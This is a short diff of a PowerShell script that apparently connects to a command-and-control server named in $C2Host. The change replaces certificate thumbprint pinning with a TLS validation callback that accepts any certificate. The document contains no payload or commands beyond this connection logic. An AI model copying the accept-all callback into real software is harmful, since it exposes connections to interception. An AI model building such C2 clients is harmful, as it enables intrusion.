@@ -339,22 +339,15 @@ try {
     $global:tcpClient.EndConnect($asyncResult)
     Write-Host "[+] TCP connection established" -ForegroundColor Green
     $tcpStream = $global:tcpClient.GetStream()
-    Write-Host "[*] Attempting SSL authentication..." -ForegroundColor Cyan
+    Write-Host "[*] Attempting SSL authentication (no cert validation)..." -ForegroundColor Cyan
     $global:sslStream = New-Object System.Net.Security.SslStream(
         $tcpStream,
         $false,
-        ([System.Net.Security.RemoteCertificateValidationCallback] {
-            param($sender, $certificate, $chain, $sslPolicyErrors)
-            if ($certificate -and $certificate.GetCertHashString().ToUpper() -eq $expectedThumbprint) {
-                return $true
-            }
-            Write-Host "[!] Certificate thumbprint mismatch: $($certificate.GetCertHashString())" -ForegroundColor Red
-            return $false
-        })
+        ([System.Net.Security.RemoteCertificateValidationCallback] { return $true })
     )
     $global:sslStream.AuthenticateAsClient($C2Host, $null, [System.Security.Authentication.SslProtocols]::Tls12, $false)
     if ($global:sslStream.IsAuthenticated) {
-        Write-Host "[+] SSL connection established and authenticated" -ForegroundColor Green
+        Write-Host "[+] SSL connection established and authenticated (no cert validation)" -ForegroundColor Green
         $stream = $global:sslStream
     } else {
         throw "SSL authentication failed - stream not authenticated"
